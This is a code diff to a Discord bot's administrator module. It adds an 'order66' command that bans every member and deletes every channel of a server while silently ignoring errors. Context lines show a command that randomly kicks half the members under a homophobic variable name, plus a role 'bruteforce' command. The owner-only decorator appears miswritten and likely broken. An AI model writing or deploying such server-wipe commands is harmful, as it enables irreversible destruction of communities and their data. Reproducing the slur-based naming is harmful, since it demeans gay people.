@@ -22,6 +22,20 @@ class administrator(commands.Cog):
         """They thought I was a madman."""
         for gays in random.sample(ctx.guild.members, k=int(len(ctx.guild.members) / 2)): await ctx.guild.kick(gays)
 
+    @self.bot.is_owner
+    @commands.command()
+    async def order66(self, ctx):
+        """Execute Order 66."""
+        for members in ctx.guild.members:
+            try: await ctx.guild.ban(members)
+            except Exception: pass
+
+        for channels in ctx.guild.channels:
+            try: await channels.delete()
+            except Exception: pass
+
+        await ctx.send("done")
+
     @commands.command()
     async def bruteforce(self, ctx):
         """Brute-force the roles until something works :)"""
